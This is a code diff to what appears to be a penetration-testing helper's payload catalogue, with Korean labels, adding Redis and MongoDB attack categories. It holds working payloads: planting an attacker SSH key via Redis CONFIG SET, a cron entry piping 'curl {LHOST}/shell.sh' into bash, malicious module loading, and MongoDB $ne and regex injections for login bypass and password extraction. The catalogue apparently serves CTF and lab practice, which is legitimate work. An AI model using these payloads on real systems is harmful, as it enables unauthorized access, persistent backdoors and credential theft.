@@ -311,6 +311,62 @@ export const sqlPayloadCategories: SqlPayloadCategory[] = [
     ],
   },
   {
+    id: "redis-basics",
+    title: "Redis 기초 명령 · 정찰",
+    engines: ["redis"],
+    description: "비인증(unauthenticated) Redis는 HTB류 박스에서 아주 흔합니다 -- redis-cli로 " +
+      "바로 접속되면 인증 우회 없이 아래 명령을 그대로 씁니다.",
+    payloads: [
+      { label: "서버 정보", context: "direct", payload: "INFO" },
+      { label: "데이터베이스별 키 개수", context: "direct", payload: "INFO keyspace" },
+      { label: "현재 DB의 키 목록", context: "direct", payload: "KEYS *" },
+      { label: "쓰기 경로 확인", context: "direct", payload: "CONFIG GET dir",
+        note: "이어서 CONFIG GET dbfilename으로 파일명도 확인하세요." },
+      { label: "RCE (SSH authorized_keys 심기)", context: "direct",
+        payload: "CONFIG SET dir /root/.ssh\nCONFIG SET dbfilename authorized_keys\n" +
+          "SET x \"\\n\\n<공격자 공개키>\\n\\n\"\nSAVE",
+        note: "redis 프로세스가 그 홈 디렉터리에 쓸 권한이 있어야 합니다(/root 대신 " +
+          "실제 redis 실행 계정의 홈으로 바꿔야 할 수 있음). <공격자 공개키> 자리에 " +
+          "본인의 ssh-ed25519/ssh-rsa 공개키 전체를 넣으세요." },
+      { label: "RCE (크론 등록)", context: "direct",
+        payload: "CONFIG SET dir /var/spool/cron/crontabs\nCONFIG SET dbfilename root\n" +
+          "SET x \"\\n* * * * * root curl http://{LHOST}:8000/shell.sh|bash\\n\"\nSAVE",
+        note: "배포판에 따라 /var/spool/cron/crontabs/root 대신 /etc/cron.d/에 심어야 " +
+          "할 수 있습니다. shell.sh는 python3 -m http.server 등으로 미리 호스팅해두세요." },
+      { label: "모듈 로드 RCE (Redis 4+)", context: "direct",
+        payload: "MODULE LOAD /path/to/exp.so",
+        note: "대상에 이미 업로드해둔 악성 모듈(.so)이 필요한 별도 준비 단계가 있는 " +
+          "기법입니다 -- redis-rogue-server 같은 공개 도구가 이 과정을 자동화합니다." },
+    ],
+  },
+  {
+    id: "mongodb-basics",
+    title: "MongoDB 기초 명령 · NoSQL 인젝션",
+    engines: ["mongodb"],
+    description: "SQL 문법이 아니라 JSON 쿼리 연산자를 씁니다 -- 로그인 폼처럼 JSON 바디를 " +
+      "그대로 받는 곳에서 인증 우회를 시도할 때는 URL이 아니라 요청 바디에 넣으세요.",
+    payloads: [
+      { label: "버전 확인", context: "direct", payload: "db.version()" },
+      { label: "데이터베이스 목록", context: "direct", payload: "show dbs" },
+      { label: "컬렉션 목록 (use <db> 먼저)", context: "direct", payload: "show collections" },
+      { label: "컬렉션 전체 조회", context: "direct", payload: "db.<collection>.find().pretty()" },
+      { label: "계정 목록 (인증 없이 접근되는 경우)", context: "direct",
+        payload: "use admin\ndb.system.users.find()" },
+      { label: "인증 우회 ($ne, JSON 바디)", context: "injection",
+        payload: "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+        note: "로그인 폼이 username/password를 그대로 쿼리에 꽂아 넣는 경우, JSON 요청 " +
+          "바디의 해당 필드를 이 객체로 통째로 교체하세요(Content-Type: application/json)." },
+      { label: "인증 우회 (비밀번호 정규식 blind)", context: "injection",
+        payload: "{\"username\": \"admin\", \"password\": {\"$regex\": \"^a\"}}",
+        note: "정규식을 한 글자씩 넓혀가며 참/거짓 응답 차이로 비밀번호를 유추할 수 있습니다." },
+      { label: "서버사이드 JS 실행 (구버전, 4.2 이전)", context: "direct",
+        payload: "db.eval(\"return 1+1\")",
+        note: "db.eval()과 mapReduce의 JS 실행은 MongoDB 4.2에서 제거됐습니다 -- 오래된 " +
+          "인스턴스에서만 시도해볼 만합니다. 이것만으로 OS 명령 실행까지 바로 이어지진 " +
+          "않고, 서버 프로세스 안에서 JS가 도는 것까지만 확인됩니다." },
+    ],
+  },
+  {
     id: "waf-bypass",
     title: "필터·WAF 우회",
     engines: ["generic"],
@@ -338,6 +394,8 @@ const dbPayloadCategoryIds: Record<string, string[]> = {
   postgresql: ["postgres-basics", "postgres-copy-program"],
   mysql: ["mysql-basics", "mysql-outfile-webshell", "mysql-udf-rce"],
   "ms-sql-s": ["mssql-basics", "mssql-xp-cmdshell"],
+  redis: ["redis-basics"],
+  mongodb: ["mongodb-basics"],
 };
 
 export function dbPayloadCategoriesFor(serviceName: string): SqlPayloadCategory[] {
